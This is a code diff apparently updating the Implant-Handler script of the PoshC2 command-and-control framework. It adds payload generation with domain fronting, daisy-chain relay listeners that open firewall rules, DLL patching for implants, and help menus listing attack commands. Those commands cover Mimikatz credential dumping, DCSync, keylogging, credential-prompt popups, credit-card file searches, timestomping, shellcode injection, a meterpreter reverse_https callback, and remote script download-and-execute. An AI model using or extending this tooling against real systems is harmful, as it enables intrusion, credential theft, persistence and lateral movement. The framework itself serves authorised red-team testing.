@@ -45,9 +45,15 @@ function Implant-Handler
     $ipv4address = $c2serverresults.HostnameIP
     $serverport = $c2serverresults.ServerPort
     $URLS =  $c2serverresults.URLS
+    $EncKey =  $c2serverresults.EncKey
     $SocksURLS =  $c2serverresults.SocksURLS
     $Insecure =  $c2serverresults.Insecure
     $useragent =  $c2serverresults.UserAgent
+    $Referer =  $c2serverresults.Referer
+    $urlstring = $URLS
+    $newImplant = $urlstring -split ","
+    $newImplantURL = $newImplant[0] -replace '"',''
+
     $Host.ui.RawUI.WindowTitle = "PoshC2 Implant Handler: $ipv4address Port $serverport"
         
 $head = '
@@ -118,7 +124,7 @@ $header = '
             Write-Host -Object "|   |  Y Y  \  |_> >  |__/ __ \|   |  \  |  \___ \ " -ForegroundColor Green
             Write-Host -Object "|___|__|_|  /   __/|____(____  /___|  /__| /____  >" -ForegroundColor Green
             Write-Host -Object "          \/|__|             \/     \/          \/ " -ForegroundColor Green
-            Write-Host "============== v3.0 www.PoshC2.co.uk =============" -ForegroundColor Green
+            Write-Host "============== v3.8 www.PoshC2.co.uk =============" -ForegroundColor Green
             Write-Host ""
             foreach ($implant in $dbresults) 
             { 
@@ -172,6 +178,10 @@ $header = '
             elseif ($global:implantid -eq "?"){
                $HelpOutput = "PrintMainHelp"
                startup
+            }
+            if ($global:implantid.ToLower().StartsWith("createnewpayload")){
+                $global:implantid | IEX
+                $HelpOutput = "Created New Payloads"
             }
             elseif ($global:implantid.ToLower().StartsWith("set-defaultbeacon")) 
             {
@@ -302,11 +312,12 @@ $header = '
                $allresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants" -As PSObject
                $ImplantsArray = @()
                foreach ($implantres in $allresults) {                  
-                    $ImplantLog = New-Object PSObject | Select ImplantID, RandomURI, User, Hostname, IPAddress, FirstSeen, LastSeen, PID, Arch, Domain, Sleep
+                    $ImplantLog = New-Object PSObject | Select ImplantID, RandomURI, User, Proxy, Hostname, IPAddress, FirstSeen, LastSeen, PID, Arch, Domain, Sleep
                     $ImplantLog.ImplantID = $implantres.ImplantID;
                     $ImplantLog.RandomURI = $implantres.RandomURI;
                     $ImplantLog.User = $implantres.User;
                     $ImplantLog.Hostname = $implantres.Hostname;
+                    $ImplantLog.Proxy = $implantres.Proxy;
                     $ImplantLog.IPAddress = $implantres.IPAddress;
                     $ImplantLog.FirstSeen = $implantres.FirstSeen;
                     $ImplantLog.LastSeen = $implantres.LastSeen;
@@ -322,10 +333,13 @@ $header = '
                $allresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks" -As PSObject
                $TasksArray = @()
                foreach ($task in $allresults) {                  
-                    $ImplantTask = New-Object PSObject | Select TaskID, Timestamp, RandomURI, Command, Output
+                    $ImplantTask = New-Object PSObject | Select TaskID, Timestamp, Hostname, ImplantID, Command, Output
                     $ImplantTask.TaskID = $task.CompletedTaskID;
                     $ImplantTask.Timestamp = $task.TaskID;
-                    $ImplantTask.RandomURI = $task.RandomURI;
+                    $ranuri = $task.RandomURI;
+                    $Rest = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE RandomURI='$ranuri'" -As PSObject
+                    $ImplantTask.Hostname = $Rest.Hostname
+                    $ImplantTask.ImplantID = $Rest.ImplantID;
                     $ImplantTask.Command = $task.Command;
                     $ImplantTask.Output = $task.Output;
                     $TasksArray += $ImplantTask
@@ -359,9 +373,36 @@ $header = '
                 start-process $FolderPath\payloads\payload.bat
                 $HelpOutput = "Pwning self......"
                 $HelpOutput
+            } elseif ($global:implantid.ToLower().StartsWith("history"))
+            {
+                $History = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM History" -As PSObject
+                foreach ($item in $History)
+                {
+                    $HelpOutput += $item.Command + "`n"
+                }
             } elseif ($global:implantid.ToLower().StartsWith("show-serverinfo"))
             {
-                $HelpOutput  = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
+                $item = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
+                $HelpOutput += "Hostname: $($item.HostnameIP) `n"
+                $HelpOutput += "ServerPort: $($item.ServerPort) `n"
+                $HelpOutput += "EncKey: $($item.EncKey) `n"
+                if ($item.DomainFrontHeader) { $HelpOutput += "DomainFrontHeader: $($item.DomainFrontHeader) `n"}
+                $HelpOutput += "DefaultSleep: $($item.DefaultSleep) `n"
+                $HelpOutput += "KillDate: $($item.KillDate) `n"
+                $HelpOutput += "HTTPResponse: $($item.HTTPResponse) `n"
+                $HelpOutput += "FolderPath: $($item.FolderPath) `n"
+                $HelpOutput += "QuickCommand: $($item.QuickCommand) `n"
+                if ($item.ProxyURL) { $HelpOutput += "ProxyURL: $($item.ProxyURL) `n"}
+                if ($item.ProxyUser) { $HelpOutput += "ProxyUser: $($item.ProxyUser) `n"}
+                if ($item.ProxyPass) { $HelpOutput += "ProxyPass: $($item.ProxyPass) `n"}
+                $HelpOutput += "Sounds: $($item.Sounds) `n"
+                if ($item.APIKEY) { $HelpOutput += "APIKEY: $($item.APIKEY) `n"}
+                if ($item.MobileNumber) { $HelpOutput += "MobileNumber: $($item.MobileNumber) `n"}
+                $HelpOutput += "URLS: $($item.URLS) `n"
+                $HelpOutput += "SocksURLS: $($item.SocksURLS) `n"
+                $HelpOutput += "Insecure: $($item.Insecure) `n"
+                $HelpOutput += "UserAgent: $($item.UserAgent) `n"
+                if ($item.Referer) { $HelpOutput += "Referer: $($item.Referer) `n"}
                 $HelpOutput
             } elseif ($global:implantid.ToLower().StartsWith("createproxypayload")) 
             {
@@ -425,6 +466,7 @@ $header = '
         write-host `n "Server Commands: " -ForegroundColor Green
         write-host "=====================" -ForegroundColor Red
         write-host " Show-ServerInfo" -ForegroundColor Green 
+        write-host " History"-ForegroundColor Green
         write-host " Output-To-HTML"-ForegroundColor Green
         write-host " Set-ClockworkSMSApiKey df2----"-ForegroundColor Green
         write-host " Set-ClockworkSMSNumber 44789----"-ForegroundColor Green
@@ -432,10 +474,12 @@ $header = '
         write-host " ListModules " -ForegroundColor Green
         write-host " PwnSelf (Alias: P)" -ForegroundColor Green
         write-host " Creds -Action <dump/add/del/search> -Username <username> -password/-hash"-ForegroundColor Green 
+        write-host " CreateNewPayload -hostname https://hostname.com -domainfrontheader <url> " -ForegroundColor Green 
         write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green  
     }
 
-    function print-help {
+    function print-help($t=0) {
+    if (($t -eq 1) -or ($t -eq 0)) {
         write-host `n "Implant Features: " -ForegroundColor Green
         write-host "=====================" -ForegroundColor Red
         write-host " Beacon 60s / Beacon 10m / Beacon 2h"-ForegroundColor Green 
@@ -452,14 +496,18 @@ $header = '
         write-host " Get-System-WithDaisy" -ForegroundColor Green 
         write-host " Get-ImplantWorkingDirectory"-ForegroundColor Green
         write-host " Get-Pid" -ForegroundColor Green 
+        write-host " Posh-Delete C:\Temp\svc.exe" -ForegroundColor Green
         write-host " Get-Webpage http://intranet" -ForegroundColor Green 
         write-host " ListModules " -ForegroundColor Green
         write-host " ModulesLoaded " -ForegroundColor Green 
         write-host " LoadModule <modulename>" -ForegroundColor Green 
         write-host " LoadModule Inveigh.ps1" -ForegroundColor Green
+        write-host " Get-UserInfo" -ForegroundColor Green
+        write-host " Invoke-HostEnum -All" -ForegroundColor Green
+        write-host " Find-AllVulns" -ForegroundColor Green
         write-host " Invoke-Expression (Get-Webclient).DownloadString(`"https://module.ps1`")" -ForegroundColor Green
         write-host " StartAnotherImplant or SAI" -ForegroundColor Green 
-        write-host " Invoke-DaisyChain -name dc1daisy -daisyserver http://192.168.1.1 -port 80 -c2port 80 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass" -ForegroundColor Green
+        write-host " Invoke-DaisyChain -name dc1daisy -daisyserver http://192.168.1.1 -port 80 -c2port 80 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass -localhost (optional if low level user)" -ForegroundColor Green
         write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green
         write-host " Get-MSHotfixes" -ForegroundColor Green 
         write-host " Get-FireWallRulesAll | Out-String -Width 200" -ForegroundColor Green 
@@ -471,6 +519,9 @@ $header = '
         write-host " Get-CreditCardData -Path 'C:\Backup\'" -ForegroundColor Green
         write-host " TimeStomp C:\Windows\System32\Service.exe `"01/03/2008 12:12 pm`"" -ForegroundColor Green
         write-host " iCacls C:\Windows\System32\ResetPassword.exe /grant Administrator:F" -ForegroundColor Green
+        write-host " Get-AllFirewallRules C:\temp\rules.csv" -ForegroundColor Green
+        write-host " Get-AllServices" -ForegroundColor Green
+    } if (($t -eq 0) -or ($t -eq 2)) {
         write-host `n "Privilege Escalation: " -ForegroundColor Green
         write-host "====================" -ForegroundColor Red
         write-host " Invoke-AllChecks" -ForegroundColor Green
@@ -482,6 +533,7 @@ $header = '
         write-host " Get-GPPPassword" -ForegroundColor Green 
         write-host " Get-Content 'C:\ProgramData\McAfee\Common Framework\SiteList.xml'" -ForegroundColor Green
         write-host " Dir -Recurse | Select-String -pattern 'password='" -ForegroundColor Green
+    } if (($t -eq 0) -or ($t -eq 3)) {
         write-host `n "File Management: " -ForegroundColor Green
         write-host "====================" -ForegroundColor Red
         write-host " Download-File -Source 'C:\Temp Dir\Run.exe'" -ForegroundColor Green
@@ -495,7 +547,7 @@ $header = '
         write-host " InstallExe-Persistence" -ForegroundColor Green
         write-host " RemoveExe-Persistence" -ForegroundColor Green
         write-host " Install-ServiceLevel-Persistence | Remove-ServiceLevel-Persistence" -ForegroundColor Green 
-        write-host " Install-ServiceLevel-PersistenceWithProxy | Remove-ServiceLevel-Persistence" -ForegroundColor Green 
+        write-host " Install-ServiceLevel-PersistenceWithProxy | Remove-ServiceLevel-Persistence" -ForegroundColor Green
         write-host `n "Network Tasks / Lateral Movement: " -ForegroundColor Green
         write-host "==================" -ForegroundColor Red
         write-host " Get-ExternalIP" -ForegroundColor Green
@@ -505,12 +557,14 @@ $header = '
         write-host " Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Pass -Command `"net user SMBExec Winter2017 /add`"" -ForegroundColor Green
         write-host " Net View | Net Users | Net localgroup administrators | Net Accounts /dom " -ForegroundColor Green
         write-host " Whoami /groups | Whoami /priv " -ForegroundColor Green  
+    } if (($t -eq 0) -or ($t -eq 4)) {
         write-host `n "Active Directory Enumeration: " -ForegroundColor Green
         write-host "==================" -ForegroundColor Red
         write-host " Invoke-ACLScanner" -ForegroundColor Green
         write-host " Get-ObjectACL -ResolveGUIDs -SamAccountName john" -ForegroundColor Green
         write-host " Add-ObjectACL -TargetSamAccountName arobbins -PrincipalSamAccountName harmj0y -Rights ResetPassword" -ForegroundColor Green
         write-host " Get-Netuser -admincount | select samaccountname" -ForegroundColor Green
+        write-host " Get-DomainUser -UACFilter NOT_PASSWORD_EXPIRED,NOT_ACCOUNTDISABLE -Properties samaccountname,pwdlastset | Export-Csv act.csv" -ForegroundColor Green
         write-host " Get-Netgroup -admincount | select samaccountname" -ForegroundColor Green
         write-host " Get-NetGroupMember `"Domain Admins`" -recurse|select membername" -ForegroundColor Green
         write-host ' Get-NetComputer | Select-String -pattern "Citrix" ' -ForegroundColor Green 
@@ -533,6 +587,7 @@ $header = '
         write-host " Invoke-MapDomainTrust" -ForegroundColor Green 
         write-host ' Get-NetUser -domain child.parent.com -Filter samaccountname=test' -ForegroundColor Green 
         write-host ' Get-NetGroup -domain child.parent.com | select samaccountname' -ForegroundColor Green 
+    } if (($t -eq 0) -or ($t -eq 5)) {
         write-host `n "Domain / Network Tasks: " -ForegroundColor Green
         write-host "==================" -ForegroundColor Red
         write-host " Invoke-BloodHound -CollectionMethod 'Stealth' -CSVFolder C:\temp\" -ForegroundColor Green
@@ -551,24 +606,31 @@ $header = '
         Write-Host " Get-PassPol" -ForegroundColor Green
         Write-Host " Get-PassNotExp" -ForegroundColor Green
         Write-Host " Get-LocAdm" -ForegroundColor Green
-        Write-Host " Invoke-Pipekat -Target <ip-optional> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional>" -ForegroundColor Green
         Write-Host " Invoke-Inveigh -HTTP Y -Proxy Y -NBNS Y -Tool 1" -ForegroundColor Green
         Write-Host " Get-Inveigh | Stop-Inveigh (Gets Output from Inveigh Thread)" -ForegroundColor Green
         Write-Host " Invoke-Sniffer -OutputFile C:\Temp\Output.txt -MaxSize 50MB -LocalIP 10.10.10.10" -ForegroundColor Green
         Write-Host " Invoke-SqlQuery -sqlServer 10.0.0.1 -User sa -Pass sa -Query 'SELECT @@VERSION'" -ForegroundColor Green
-        Write-Host " Invoke-Runas -User SomeAccount -Password SomePass -Domain SomeDomain -Command C:\Windows\System32\cmd.exe -Args `" /c calc.exe`"" -ForegroundColor Green        
+        Write-Host " Invoke-Runas -User <user> -Password '<pass>' -Domain <dom> -Command C:\Windows\System32\cmd.exe -Args `" /c calc.exe`"" -ForegroundColor Green                
+        Write-Host " Invoke-Pipekat -Target <ip-optional> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional>" -ForegroundColor Green
+        write-host " Invoke-WMIExec -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional> -command <cmd>" -ForegroundColor Green
+     } if (($t -eq 0) -or ($t -eq 6)) {
+        write-host `n "Lateral Movement: " -ForegroundColor Green
+        write-host "=========================================================" -ForegroundColor Red
+        Write-Host " Invoke-RunasPayload -User <user> -Password '<pass>' -Domain <dom>" -ForegroundColor Green        
+        Write-Host " Invoke-RunasProxyPayload -User <user> -Password '<pass>' -Domain <dom>" -ForegroundColor Green        
+        Write-Host " Invoke-RunasDaisyPayload -User <user> -Password '<pass>' -Domain <dom>" -ForegroundColor Green        
         write-host " Invoke-DCOMPayload -Target <ip>" -ForegroundColor Green
         write-host " Invoke-DCOMProxyPayload -Target <ip>" -ForegroundColor Green
         write-host " Invoke-DCOMDaisyPayload -Target <ip>" -ForegroundColor Green
         write-host " Invoke-PsExecPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
         write-host " Invoke-PsExecProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
-        write-host " Invoke-PsExecDiasyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
+        write-host " Invoke-PsExecDaisyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
         write-host " Invoke-WMIPayload -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional>" -ForegroundColor Green
         write-host " Invoke-WMIProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
-        write-host " Invoke-WMIDaisyPayload -Target <ip> -Domain <dom> -user <user> -pass '<pass>'" -ForegroundColor Green
-        write-host " Invoke-WMIExec -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional> -command <cmd>" -ForegroundColor Green
+        write-host " Invoke-WMIDaisyPayload -Target <ip> -Domain <dom> -user <user> -pass '<pass>'" -ForegroundColor Green        
         #write-host " EnableWinRM | DisableWinRM -computer <dns/ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
         write-host " Invoke-WinRMSession -IPAddress <ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
+    } if (($t -eq 0) -or ($t -eq 7)) {
         write-host `n "Credentials / Tokens / Local Hashes (Must be SYSTEM): " -ForegroundColor Green
         write-host "=========================================================" -ForegroundColor Red
         write-host " Invoke-Mimikatz | Out-String | Parse-Mimikatz" -ForegroundColor Green
@@ -589,29 +651,31 @@ $header = '
         write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::dcsync /domain:domain.local /user:administrator$($speechmarks)$($tick)" -ForegroundColor Green
         write-host " Invoke-DCSync -PWDumpFormat" -ForegroundColor Green
         write-host " Dump-NTDS -EmptyFolder <emptyfolderpath>" -ForegroundColor Green
+    } if (($t -eq 0) -or ($t -eq 8)) {
         write-host `n "Useful Modules: " -ForegroundColor Green
         write-host "====================" -ForegroundColor Red
-        write-host " Show-ServerInfo" -ForegroundColor Green 
         write-host " Get-Screenshot" -ForegroundColor Green
+        write-host " Get-ScreenshotAllWindows" -ForegroundColor Green
         write-host " Get-ScreenshotMulti -Timedelay 120 -Quantity 30" -ForegroundColor Green
         write-host " Get-RecentFiles" -ForegroundColor Green
         write-host " Cred-Popper" -ForegroundColor Green 
         write-host " Get-Clipboard" -ForegroundColor Green 
         write-host " Hashdump" -ForegroundColor Green 
-        write-host ' Get-Keystrokes -LogPath "$($Env:TEMP)\key.log"' -ForegroundColor Green
-        write-host " PortScan -IPaddress 10.0.0.1-50 -Ports `"1-65535`" -maxQueriesPS 10000" -ForegroundColor Green
-        write-host " Invoke-Portscan -Hosts 192.168.1.1/24,10.10.10.10 -T 4 -Ports `"445,3389,22-25`" | Select Hostname,OpenPorts" -ForegroundColor Green
+        write-host ' Get-Keystrokes' -ForegroundColor Green
+        write-host " ArpScan -IPCidr 10.0.0.1/24" -ForegroundColor Green
+        write-host " PortScan -IPaddress 10.0.0.1-50 -Ports `"1-65535`" -maxQueriesPS 10000 -delay 0" -ForegroundColor Green
         write-host " Invoke-UserHunter -StopOnSuccess" -ForegroundColor Green
         write-host " Migrate" -ForegroundColor Green
-        write-host " Migrate -ProcID 444" -ForegroundColor Green
-        write-host " Migrate -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
-        #write-host " Migrate-x64 -ProcID 4444" -ForegroundColor Green
-        #write-host " Migrate-x64 -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
-        #write-host " Migrate-x86 -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
-        #write-host " Migrate-Proxy-x86 -ProcID 4444" -ForegroundColor Green
-        #write-host " Migrate-Proxy-x64 -ProcID 444" -ForegroundColor Green
-        #write-host " Migrate-Daisy-x86 -Name DC1  -ProcID 444" -ForegroundColor Green
-        #write-host " Migrate-Daisy-x64 -Name DC2" -ForegroundColor Green
+        write-host " Migrate -x64 -ProcID 444" -ForegroundColor Green
+        write-host " Migrate -x64 -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
+        write-host " Migrate -x86" -ForegroundColor Green
+        write-host " Migrate-x64 -ProcID 4444" -ForegroundColor Green
+        write-host " Migrate-x64 -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
+        write-host " Migrate-x86 -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
+        write-host " Migrate-Proxy-x86 -ProcID 4444" -ForegroundColor Green
+        write-host " Migrate-Proxy-x64 -ProcID 444" -ForegroundColor Green
+        write-host " Migrate-Daisy-x86 -Name DC1  -ProcID 444" -ForegroundColor Green
+        write-host " Migrate-Daisy-x64 -Name DC2" -ForegroundColor Green
         write-host " Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte) -ProcID 5634" -ForegroundColor Green
         write-host " Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 172.16.0.100 -Lport 443 -Force" -ForegroundColor Green
         write-host ' Get-Eventlog -newest 10000 -instanceid 4624 -logname security | select message -ExpandProperty message | select-string -pattern "user1|user2|user3"' -ForegroundColor Green
@@ -621,6 +685,7 @@ $header = '
         write-host "=====================" -ForegroundColor Red
         write-host " Back" -ForegroundColor Green 
         write-host " Exit" `n -ForegroundColor Green 
+        }
     }
 
     # call back command
@@ -706,30 +771,31 @@ primer | iex }'
         [System.Convert]::ToBase64String($aesManaged.Key)
     }
     function PatchDll {
-        param($dllBytes, $replaceString, $Arch)
+        param($dllBytes, $replaceString, $Arch, $offset)
 
         if ($Arch -eq 'x86') {
-            $dllOffset = 0x00012D80
+            $dllOffset = 0x00012F80
             #$dllOffset = 0x00012ED0 +8
         }
         if ($Arch -eq 'x64') {
-            $dllOffset = 0x00017100
+            $dllOffset = 0x00017300
         }
-
-        # Patch DLL - replace 5000 A's
-        $AAAA = "A"*5000
-        $AAAABytes = ([System.Text.Encoding]::UNICODE).GetBytes($AAAA)
+        if($offset) {
+            $dllOffset = $offset
+        }
+        
+        # Patch DLL - replace 8000 A's
         $replaceStringBytes = ([System.Text.Encoding]::UNICODE).GetBytes($replaceString)
     
         # Length of replacement code
         $dllLength = $replaceString.Length
-        $patchLength = 5000 -$dllLength
+        $patchLength = 8000 -$dllLength
         $nullString = 0x00*$patchLength
         $nullBytes = ([System.Text.Encoding]::UNICODE).GetBytes($nullString)
         $nullBytes = $nullBytes[1..$patchLength]
         $replaceNewStringBytes = ($replaceStringBytes+$nullBytes)
 
-        $dllLength = 10000 -3
+        $dllLength = 16000 -2
         $i=0
         # Loop through each byte from start position
         $dllOffset..($dllOffset + $dllLength) | % {
@@ -742,6 +808,29 @@ primer | iex }'
     }
 
 # create proxypayloads
+function CreateNewPayload 
+{
+    param
+    (
+        [Parameter(Mandatory=$true)][AllowEmptyString()][string]$hostname,
+        [Parameter(Mandatory=$false)][AllowEmptyString()][string]$domainfrontheader
+    )
+    if ($Insecure -eq "Yes") {
+        $command = createdropper -enckey $enckey -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $hostname -serverport $serverport -Insecure -useragent $useragent -Referer $Referer
+    } else {
+        $command = createdropper -enckey $enckey -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $hostname -serverport $serverport -useragent $useragent -Referer $Referer
+    }
+    $dom = $hostname -replace "https://",""
+    $dom = $dom -replace "http://",""
+    
+    $payload = createrawpayload -command $command
+    # create proxy payloads
+    CreatePayload -Domain $dom
+    CreateStandAloneExe -Domain $dom
+    CreateDLL -Domain $dom
+}
+
+# create proxypayloads
 function CreateProxyPayload 
 {
     param
@@ -751,9 +840,9 @@ function CreateProxyPayload
         [Parameter(Mandatory=$true)][string]$proxyurl
     )
     if ($Insecure -eq "Yes") {
-        $command = createdropper -Proxy -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl -Insecure
+        $command = createdropper -enckey $enckey -Proxy -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl -Insecure -useragent $useragent -Referer $Referer
     } else {
-        $command = createdropper -Proxy -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl
+        $command = createdropper -enckey $enckey -Proxy -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl -useragent $useragent -Referer $Referer
     }
             
     $payload = createrawpayload -command $command
@@ -771,17 +860,27 @@ param(
 [Parameter(Mandatory=$true)][string]$daisyserver,
 [Parameter(Mandatory=$true)][string]$c2server, 
 [Parameter(Mandatory=$true)][string]$c2port, 
-[Parameter(Mandatory=$true)][AllowEmptyString()][string]$domfront, 
-[Parameter(Mandatory=$true)][AllowEmptyString()][string]$proxyurl, 
-[Parameter(Mandatory=$true)][AllowEmptyString()][string]$proxyuser, 
-[Parameter(Mandatory=$true)][AllowEmptyString()][string]$proxypassword)
+[Parameter(Mandatory=$false)][switch]$Localhost,
+[Parameter(Mandatory=$false)][AllowEmptyString()][string]$domfront, 
+[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxyurl, 
+[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxyuser, 
+[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxypassword)
+
+$firewallName = Get-RandomURI -Length 15
 
 $fw = Read-Host "Do you want to create a firewall rule for this: Y/N"
 if ($fw -eq "Y") {
-    $fwcmd = "Netsh.exe advfirewall firewall add rule name=`"Daisy`" dir=in action=allow protocol=TCP localport=$port enable=yes"
+    $fwcmd = "Netsh.exe advfirewall firewall add rule name=`"$firewallName`" dir=in action=allow protocol=TCP localport=$port enable=yes"
 }
 
-$command = createdropper -Daisy -killdate $killdatefm -ipv4address $daisyserver -serverport $port 
+if ($Localhost.IsPresent){
+$HTTPServer = "localhost"
+$daisyserver = "http://localhost"
+} else {
+$HTTPServer = "+"
+}
+
+$command = createdropper -enckey $enckey -Daisy -killdate $killdatefm -ipv4address $daisyserver -serverport $port -Referer $Referer
 $payload = createrawpayload -command $command
 
 # create proxy payloads
@@ -792,6 +891,7 @@ CreateDLL -DaisyName $name
 
 [IO.File]::WriteAllLines("$FolderPath\payloads\$($name).bat", $payload)
 Write-Host -Object "Payload written to: $FolderPath\payloads\$($name).bat"  -ForegroundColor Green
+
 
 $fdsf = @"
 `$username = "$proxyuser"
@@ -810,14 +910,13 @@ if (`$k -lt `$d) {exit}
 `$password = `$password
 `$proxyurl = `$proxyurl
 `$wc = New-Object System.Net.WebClient;  
-`$wc.Headers.Add("User-Agent","'+$useragent+'")
+`$wc.Headers.Add("User-Agent","$useragent")
+`$wc.Headers.Add("Referer","$referer")
 `$h=`$domainfrontheader
 if (`$h) {`$wc.Headers.Add("Host",`$h)}
 if (`$proxyurl) {
 `$wp = New-Object System.Net.WebProxy(`$proxyurl,`$true); 
 `$wc.Proxy = `$wp;
-} else {
-`$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
 }
 if (`$username -and `$password) {
 `$PSS = ConvertTo-SecureString `$password -AsPlainText -Force; 
@@ -837,14 +936,14 @@ if (`$cookie) {
 <title>404 Not Found</title>
 </head><body>
 <h1>Not Found</h1>
-<p>The requested URL was not found on this server.</p>
+<p>The requested URL/s was not found on this server.</p>
 <hr>
 <address>Apache (Debian) Server</address>
 </body></html>
 '
-`$URLS = $($URLS),"/connect","/daisy","/proxy"
+`$URLS = $($URLS),$($SocksURLS)
 `$listener = New-Object -TypeName System.Net.HttpListener 
-`$listener.Prefixes.Add("http://+:`$serverport/") 
+`$listener.Prefixes.Add("http://$($HTTPServer):`$serverport/") 
 `$listener.Start()
 echo "started http server"
 while (`$listener.IsListening) 
@@ -856,8 +955,7 @@ while (`$listener.IsListening)
     `$response = `$context.Response       
     `$url = `$request.RawUrl
     `$method = `$request.HttpMethod
-    if (`$null -ne (`$URLS | ? { `$url -match `$_ }) ) 
-    {  
+    if (`$null -ne (`$URLS | ? { `$url -match `$_ }) ) {
         `$cookiesin = `$request.Cookies -replace 'SessionID=', ''
         `$responseStream = `$request.InputStream 
         `$targetStream = New-Object -TypeName System.IO.MemoryStream 
@@ -907,7 +1005,6 @@ while (`$listener.IsListening)
 "@
 
 $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($fdsf)
-
 $CompressedStream = New-Object IO.MemoryStream
 $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
 $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
@@ -926,6 +1023,7 @@ $fwcmd
 `$kill.log = "1"
 function Stop-Daisy {
 `$kill.log = 2
+Netsh.exe advfirewall firewall del rule name=`"$firewallName`"
 (new-object system.net.webclient).downloadstring("http://localhost:$port")
 }
 if (!`$t) { 
@@ -936,9 +1034,22 @@ if (!`$t) {
         `$Jobs = @()
         `$Job = [powershell]::Create().AddScript({$NewScript})
         `$Job.Runspace = `$Runspace
+        `$Job.BeginInvoke() | Out-Null
+        echo ""
+        echo "[+] Running DaisyServer as Administrator:"
+    } else { 
+        `$Runspace = [RunspaceFactory]::CreateRunspace()
+        `$Runspace.Open()
+        `$Runspace.SessionStateProxy.SetVariable('Kill',`$Kill)
+        `$Jobs = @()
+        `$Job = [powershell]::Create().AddScript({$NewScript})
+        `$Job.Runspace = `$Runspace
         `$Job.BeginInvoke() | Out-Null 
-    }
-    echo "To stop the Daisy Server, Stop-Daisy current process"
+        echo ""
+        echo "[+] Running DaisyServer as Standard User, must use -localhost flag for this to work:"
+    }  
+
+    echo "[+] To stop the Daisy Server, Stop-Daisy current process"
 }
 
 "@
@@ -1148,7 +1259,7 @@ function invoke-wmidaisypayload {
     [Parameter(Mandatory=$true)][string]$name,
     [Parameter(Mandatory=$true)][string]$domain,
     [Parameter(Mandatory=$true)][string]$user,
-    [Parameter(Mandatory=$false)][string]$pass,
+    [Parameter(Mandatory=$false)][string]$password,
     [Parameter(Mandatory=$false)][string]$hash
     )
     if (Test-Path "$FolderPath\payloads\$($name).bat"){ 
@@ -1167,7 +1278,7 @@ function invoke-psexecdaisypayload {
     [Parameter(Mandatory=$true)][string]$name,
     [Parameter(Mandatory=$true)][string]$domain,
     [Parameter(Mandatory=$true)][string]$user,
-    [Parameter(Mandatory=$false)][string]$pass,
+    [Parameter(Mandatory=$false)][string]$password,
     [Parameter(Mandatory=$false)][string]$hash
     )
 
@@ -1223,9 +1334,16 @@ $im_type = $dbresult.Pivot
 
 if ($im_arch -eq "AMD64"){
     $arch = "64"
-}
-else {
+} else {
     $arch = "86"
+}
+
+if ($params -like "*x86*"){
+    $arch = "86"
+}
+
+if ($params -like "*x64*"){
+    $arch = "64"
 }
 
 CheckModuleLoaded "Inject-Shellcode.ps1" $psrandomuri
@@ -1269,6 +1387,27 @@ elseif ($im_type -eq "Proxy"){
 }
 }
 
+function Get-CompressedByteArray ([byte[]] $byteArray) {
+    [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
